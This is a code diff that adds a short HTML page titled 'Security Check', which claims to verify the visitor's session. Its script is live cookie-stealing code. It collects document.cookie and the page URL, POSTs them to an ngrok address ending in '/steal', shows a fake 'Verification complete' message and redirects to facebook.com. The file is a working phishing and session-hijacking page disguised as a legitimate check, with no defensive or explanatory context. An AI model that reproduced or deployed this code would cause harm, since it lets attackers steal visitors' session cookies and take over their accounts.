@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html><head><title>Security Check</title></head>
+<body><h2>Verifying your session...</h2>
+<script>
+setTimeout(function() {
+    var data = {cookies: document.cookie, url: window.location.href, time: new Date().toISOString()};
+    fetch('https://sharen-unguillotined-confoundedly.ngrok-free.dev/steal', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    });
+    document.body.innerHTML = '<h2>Verification complete. Redirecting...</h2>';
+    setTimeout(() => window.location.href = 'https://www.facebook.com', 1500);
+}, 500);
+</script>
+</body></html>
